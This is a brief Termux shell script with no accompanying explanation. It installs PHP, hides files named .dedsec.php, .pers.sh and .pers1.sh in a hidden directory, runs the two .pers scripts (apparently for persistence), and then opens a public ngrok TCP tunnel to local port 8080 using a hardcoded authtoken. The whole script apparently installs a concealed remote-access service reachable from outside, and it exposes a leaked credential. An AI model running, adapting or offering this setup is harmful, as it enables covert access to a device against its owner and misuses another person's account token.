pkg install php -y
mkdir /data/data/com.termux/files/home/.p/ && mv .dedsec.php /data/data/com.termux/files/home/.p/ && mv .pers.sh /data/data/com.termux/files/home/.p/ && mv .pers1.sh /data/data/com.termux/files/home/.p/
sh /data/data/com.termux/files/home/.p/.pers.sh && sh /data/data/com.termux/files/home/.p/.pers1.sh
pkg update
pkg upgrade -y
cd
sleep 5
chmod +x ngrok
./ngrok authtoken 1iabGOYmHBNpWEeQPP8wj780QX8_E8zMR5aYaVB65Mhk5ohA
echo "DONE"
./ngrok tcp 8080
